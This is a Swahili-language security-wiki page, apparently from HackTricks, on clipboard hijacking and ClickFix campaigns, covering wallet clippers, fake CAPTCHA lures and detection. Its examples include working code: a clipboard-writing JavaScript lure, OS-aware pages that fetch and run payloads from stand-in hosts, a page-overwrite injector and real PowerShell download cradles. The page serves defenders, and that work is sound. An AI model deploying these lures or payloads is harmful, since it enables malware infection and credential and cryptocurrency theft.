# Mashambulizi ya Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Usipaste kamwe kitu ambacho hukukinakili mwenyewe." – ushauri wa zamani lakini bado halali

## Muhtasari

Clipboard hijacking – pia hujulikana kama *pastejacking* – hutumia ukweli kwamba watumiaji kwa kawaida hunakili na kupaste commands bila kuzikagua. Ukurasa wa wavuti hasidi (au context yoyote yenye uwezo wa JavaScript kama application ya Electron au Desktop) huweka kimprogramu maandishi yanayodhibitiwa na attacker kwenye system clipboard. Waathiriwa huhimizwa, kwa kawaida kupitia maelekezo yaliyoundwa kwa uangalifu ya social engineering, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kupaste* yaliyomo kwenye clipboard, na hivyo kutekeleza commands kiholela mara moja.

Kwa sababu **hakuna file linalopakuliwa na hakuna attachment inayofunguliwa**, technique hii hupita security controls nyingi za e-mail na web-content zinazofuatilia attachments, macros au utekelezaji wa commands moja kwa moja. Kwa hiyo attack hii ni maarufu katika phishing campaigns zinazosambaza malware families za kawaida kama vile NetSupport RAT, Latrodectus loader au Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers za kubadilisha wallet-address

Aina nyingine ya **clipboard hijacking** hai-paste commands hata kidogo: husubiri hadi victim anapocopy **cryptocurrency wallet address**, kisha huibadilisha kimya kimya na address inayodhibitiwa na attacker kabla tu ya kupaste. Hii huwa na ufanisi hasa dhidi ya wallet formats ndefu kwa sababu watumiaji mara nyingi huthibitisha herufi za mwanzo/mwisho pekee.<sup>[[8]](#references)</sup>

Sifa za kawaida zinazoonekana katika matukio halisi:
- **Thin loader + nested payload**: app/exe inayoonekana huonekana kama tool halali ya trading au "profit", huku clipper halisi ikiwa imefichwa ndani zaidi ya bundle (kwa mfano .NET loader inayozindua Rust payload iliyowekwa ndani).
- **Regex-driven replacement**: malware hulinganisha strings kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata strings za jumla zenye **herufi 44 zinazofanana na Solana**, kisha huzibadilisha kuwa attacker wallets.
- **Wallet rotation at scale**: Windows samples za kisasa zinaweza kuwa na **maelfu** ya replacement wallets kwa kila currency badala ya address moja tuli, hivyo kupunguza wallet reputation burn baada ya kila wizi.<sup>[[8]](#references)</sup>

### Mtiririko wa Windows clipper

Implementation ya kawaida ni hidden window iliyosajiliwa kwa kutumia **`AddClipboardFormatListener`**. Kila clipboard update inapotokea, malware kwa kawaida huita:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma text.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha wallet string na attacker value.

Minimal hunting regexes zinazoonekana mara kwa mara kwenye clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistence ya kiwango cha mtumiaji inatosha kusababisha impact. Mfano mmoja ulioonekana ni:<sup>[[8]](#references)</sup>
- Nakili payload kwenye **`%APPDATA%\silke\silke.exe`**
- Unda **Startup-folder LNK** chini ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya Detection:
- Processes zinazopiga clipboard APIs mfululizo huku pia zikiandika chini ya `%APPDATA%` na folda ya mtumiaji ya **Startup**.
- Uundaji mpya wa LNK/executable unaofuatwa na wallet-address clipboard rewrites.
- Archives au fake-software bundles zenye files nyingi ambazo hazitumiki pamoja na launcher ndogo inayoanzisha binary iliyo ndani ya nyingine.

### macOS kuondoa quarantine kwa social engineering + persistence ya LaunchAgent

Kwenye macOS, baadhi ya campaigns husambaza helper ya **`unlocker.command`** na kumwelekeza victim kubofya kulia → **Open** ikiwa Gatekeeper inasema app imeharibika au imetoka kwa developer asiyejulikana. Script huondoa quarantine tu na kuanzisha `.app` iliyo karibu:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Hii **si** Gatekeeper exploit; ni **social-engineered quarantine bypass** inayotumia ukweli kwamba maamuzi ya Gatekeeper yanategemea `com.apple.quarantine` xattr.<sup>[[8]](#references)</sup>

Baada ya kutekelezwa, clipper inaweza kujidumisha kama mtumiaji wa sasa kwa kuandika:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent yenye `RunAtLoad` na `KeepAlive`

Maelezo muhimu ya kujilinda ni kwamba baadhi ya samples hutumia **self-healing watchdog** inayoandika upya LaunchAgent na wrapper kila baada ya takriban sekunde 30. Ukiondoa plist kwanza **bila kuua process inayoendelea**, malware inaweza kuiunda tena mara moja.<sup>[[8]](#references)</sup> Mpangilio salama wa cleanup:
1. Ua process hai ya clipper.
2. Unload/delete LaunchAgent plist.
3. Futa `~/launch.sh` na payload iliyonakiliwa.

### Maelezo ya usambazaji: sifa bandia kama force multiplier

Kwa family hii, malware yenyewe inaweza kubaki rahisi kiufundi huku **distribution layer** ikifanya kazi kubwa: GitHub stars/forks bandia, reviews/downloads za SourceForge, comments/views za tutorial za YouTube, na comments/votes zinazoonekana kuwa halali kwenye VirusTotal hutumiwa kufanya binary ionekane ya kuaminika kabla ya kutekelezwa.<sup>[[8]](#references)</sup>

## Forced copy buttons na hidden payloads (macOS one-liners)

Baadhi ya macOS infostealers huiga tovuti za installer (kwa mfano, Homebrew) na **kulazimisha matumizi ya kitufe cha “Copy”** ili watumiaji wasiweze kuchagua maandishi yanayoonekana pekee. Ingizo la clipboard huwa na installer command inayotarajiwa pamoja na Base64 payload iliyoongezwa (kwa mfano, `...; echo <b64> | base64 -d | sh`), hivyo paste moja hutekeleza vyote viwili huku UI ikificha stage ya ziada.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, huku mpya zikitegemea **Clipboard API** ya asynchronous (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Mtiririko wa ClickFix / ClearFake

1. Mtumiaji hutembelea tovuti yenye jina linalofanana kimakosa au tovuti iliyoathiriwa (kwa mfano, `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyodungwa huita msaidizi wa `unsecuredCopyToClipboard()` anayehifadhi kimya kimya one-liner ya PowerShell iliyosimbwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika command hiyo kisha bonyeza Enter ili kutatua tatizo.”*
4. `powershell.exe` hutekelezwa na kupakua jalada lenye executable halali pamoja na DLL hasidi (DLL sideloading ya kawaida).
5. Loader hufungua stages za ziada, hudunga shellcode na huweka persistence (kwa mfano, scheduled task) – hatimaye ikiendesha NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Mlolongo wa NetSupport RAT kwa Mfano
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart halali) hutafuta `msvcp140.dll` katika saraka yake.
* DLL hasidi hutatua APIs kwa kutumia **GetProcAddress**, hupakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzifichua kwa kutumia rolling XOR key `"https://google.com/"`, huingiza shellcode ya mwisho na kufungua **client32.exe** (NetSupport RAT) kwenye `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Inapakua `la.txt` kwa kutumia **curl.exe**
2. Inatekeleza JScript downloader ndani ya **cscript.exe**
3. Inachukua MSI payload → inaweka `libcef.dll` kando ya application iliyotiwa sahihi → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer kupitia MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Wito wa **mshta** huzindua script ya PowerShell iliyofichwa ambayo hupakua `PartyContinued.exe`, hutoa `Boat.pst` (CAB), huunda upya `AutoIt3.exe` kupitia `extrac32` na uunganishaji wa files, na hatimaye huendesha script ya `.a3x` inayotoa vitambulisho vya browser na kuvipeleka kwa `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK yenye C2 inayobadilika (PureHVNC)

Baadhi ya kampeni za ClickFix huepuka kabisa upakuaji wa files na kuwaelekeza waathiriwa kubandika one-liner inayopakua na kutekeleza JavaScript kupitia WSH, kuiweka persistence, na kubadilisha C2 kila siku. Mfano wa chain iliyozingatiwa:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa hubadilishwa kuwa ya kawaida wakati wa utekelezaji ili kuzuia ukaguzi wa kijuujuu.
- JavaScript hujiendeleza kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – hivyo kuwezesha mzunguko wa haraka wa domain.<sup>[[3]](#references)</sup>

Kipande kidogo cha JS kinachotumika kuzungusha C2 kulingana na tarehe:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Hatua inayofuata kwa kawaida hu-deploy loader inayoweka persistence na kuvuta RAT (kwa mfano, PureHVNC), mara nyingi iki-pin TLS kwenye certificate iliyowekwa hardcode na kugawanya traffic vipande.<sup>[[3]](#references)</sup>

Mawazo ya detection mahususi kwa variant hii
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (au `cscript.exe`).
- Startup artifacts: LNK katika `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` inayo-invoke WScript/CScript yenye JS path chini ya `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU na command-line telemetry yenye `.split('').reverse().join('')` au `eval(a.responseText)`.
- `powershell -NoProfile -NonInteractive -Command -` inayojirudia ikiwa na payloads kubwa za stdin ili kuingiza scripts ndefu bila command lines ndefu.
- Scheduled Tasks ambazo baadaye hu-execute LOLBins kama `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` chini ya task/path inayoonekana kama updater (kwa mfano, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames na URLs zinazobadilika kila siku zenye pattern ya `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlate clipboard write events zinazofuatwa na kubandika kwa Win+R, kisha execution ya `powershell.exe` mara moja.

Blue-teams wanaweza kuchanganya clipboard, process-creation na registry telemetry ili kubainisha matumizi mabaya ya pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` huhifadhi historia ya commands za **Win + R** – tafuta entries zisizo za kawaida za Base64 / obfuscated.
* Security Event ID **4688** (Process Creation) ambapo `ParentImage` == `explorer.exe` na `NewProcessName` iko katika { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** kwa file creations chini ya `%LocalAppData%\Microsoft\Windows\WinX\` au temporary folders muda mfupi kabla ya event ya kutiliwa shaka ya 4688.
* EDR clipboard sensors (ikiwa zipo) – correlate `Clipboard Write` inayofuatwa mara moja na PowerShell process mpya.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campaigns za hivi karibuni huzalisha kwa wingi fake CDN/browser verification pages ("Just a moment…", IUAM-style) zinazowashawishi users kunakili commands maalum za OS kutoka clipboard yao na kuziweka kwenye native consoles. Hii huhamisha execution kutoka browser sandbox na hufanya kazi kwenye Windows na macOS.<sup>[[4]](#references)</sup>

Sifa kuu za pages zinazozalishwa na builder
- OS detection kupitia `navigator.userAgent` ili ku-tailor payloads (Windows PowerShell/CMD dhidi ya macOS Terminal). Decoys/no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Clipboard-copy ya kiotomatiki wakati wa UI actions zisizo na madhara (checkbox/Copy), huku text inayoonekana inaweza kutofautiana na content ya clipboard.
- Mobile blocking na popover yenye maelekezo ya hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation ya hiari na single-file injector ya ku-overwrite DOM ya site iliyo-compromise kwa verification UI iliyowekewa mtindo wa Tailwind (hakuna usajili wa domain mpya unaohitajika).<sup>[[4]](#references)</sup>

Mfano: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Uendelevu wa macOS wa utekelezaji wa kwanza
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, na hivyo kupunguza mabaki yanayoonekana.<sup>[[4]](#references)</sup>

Utekaji wa ukurasa mahali pake kwenye tovuti zilizoathirika
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Mawazo ya detection na hunting mahususi kwa lures za mtindo wa IUAM
- Web: Kurasa zinazofunga Clipboard API kwenye verification widgets; kutolingana kati ya maandishi yanayoonyeshwa na clipboard payload; branching ya `navigator.userAgent`; Tailwind + single-page replace katika contexts zinazotia shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano wa browser; batch/MSI installers zinazoendeshwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm ikianzisha `bash`/`curl`/`base64 -d` pamoja na `nohup` karibu na matukio ya browser; background jobs zinazoendelea baada ya terminal kufungwa.
- Correlate historia ya `RunMRU` Win+R na clipboard writes pamoja na uundaji unaofuata wa console process.

Tazama pia kwa supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mageuzi ya 2026 ya fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea ku-compromise sites za WordPress na ku-inject loader JavaScript inayounganisha external hosts (Cloudflare Workers, GitHub/jsDelivr) na hata blockchain “etherhiding” calls (kwa mfano, POSTs kwa Binance Smart Chain API endpoints kama `bsc-testnet.drpc[.]org`) ili kuvuta lure logic ya sasa. Overlays za hivi karibuni zinatumia sana fake CAPTCHAs zinazowaagiza watumiaji ku-copy/paste one-liner (T1204.004) badala ya kupakua chochote.<sup>[[6]](#references)</sup>
- Initial execution inazidi kukabidhiwa signed script hosts/LOLBAS. Chains za Januari 2026 zilibadilisha matumizi ya awali ya `mshta` na `SyncAppvPublishingServer.vbs` iliyojengeka ndani, ikiendeshwa kupitia `WScript.exe`, na kupitisha arguments zinazofanana na PowerShell zenye aliases/wildcards ili kuvuta remote content:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imetiwa saini na kwa kawaida hutumiwa na App-V; ikiunganishwa na `WScript.exe` na arguments zisizo za kawaida (aliases za `gal`/`gcm`, cmdlets zilizo na wildcard, na URLs za jsDelivr) huwa hatua ya LOLBAS yenye ishara kubwa kwa ClearFake.<sup>[[6]](#references)</sup>
- Payloads za fake CAPTCHA za Februari 2026 zilirudi kwenye download cradles safi za PowerShell. Mifano miwili hai:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Mnyororo wa kwanza ni grabber ya `iex(irm ...)` iliyo in-memory; wa pili hupitia `WinHttp.WinHttpRequest.5.1`, huandika `.ps1` ya muda, kisha huianzisha kwa `-ep bypass` kwenye dirisha lililofichwa.<sup>[[6]](#references)</sup>

Vidokezo vya detection/hunting kwa variants hizi
- Mfuatano wa process: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara tu baada ya clipboard writes/Win+R.
- Maneno muhimu ya command-line: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, au mifumo ya raw IP `iex(irm ...)`.
- Mtandao: outbound kwenda CDN worker hosts au blockchain RPC endpoints kutoka script hosts/PowerShell muda mfupi baada ya web browsing.
- Faili/registry: uundaji wa `.ps1` ya muda chini ya `%TEMP%` pamoja na RunMRU entries zenye one-liners hizi; zuia/toa alert kwa signed-script LOLBAS (WScript/cscript/mshta) inayotekelezwa ikiwa na external URLs au obfuscated alias strings.

## ClickFix tradecraft ya Juni 2026: paste telemetry, fake verification comments, na LOLBin chaining

Telemetry ya hivi karibuni ya Red Canary inaonyesha kwamba indicator thabiti **si command moja mahususi**, bali ni mchanganyiko wa **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, na **immediate execution**.<sup>[[7]](#references)</sup>

### Miundo mashuhuri ya operator

- **Paste confirmation telemetry**: baadhi ya payloads huita `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` kabla ya stage halisi. Hii huthibitisha user interaction huku ikifanya window ibaki fupi na tulivu.
- **Fake verification comments**: PowerShell one-liners zinaweza kuongeza strings kama `# Security check ✔️ I'm not a robot Verification ID: 138105` ili command bado ionekane inahusiana na CAPTCHA baada ya kupastewa kwenye Run / `cmd.exe` / historia ya PowerShell.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` huepuka URL tuli kwenye command line huku ikiendelea kufanya in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` hutumia casing isiyo ya kawaida na herufi zinazofanana na Unicode kwenye flags ili kuvuruga detections dhaifu huku ikiendelea kufanana na `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` inaweza kuficha keywords kwa escapes za `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), kuanzisha nested shell ikiwa minimized, kuhifadhi attacker content kwa benign extension kama `.pdf`, kisha kuiendesha kupitia `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – zima clipboard write-access (`dom.events.asyncClipboard.clipboardItem` n.k.) au hitaji user gesture.
2. Security awareness – wafundishe users *kuandika* commands nyeti au kuzipaste kwanza kwenye text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ili kuzuia one-liners zisizoidhinishwa.
4. Network controls – zuia outbound requests kwenda pastejacking na malware C2 domains zinazojulikana.

## Mbinu Zinazohusiana

* **Discord Invite Hijacking** mara nyingi hutumia ClickFix approach hiyo hiyo baada ya kuwavuta users kwenye server hasidi:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Rekebisha Click: Kuzuia ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Chini ya Pure Curtain: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: Ufichuzi wa Kwanza wa IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, mwaka wa Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Kutoka Stars hadi Upvotes: Fake Reputation Inayochochea Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
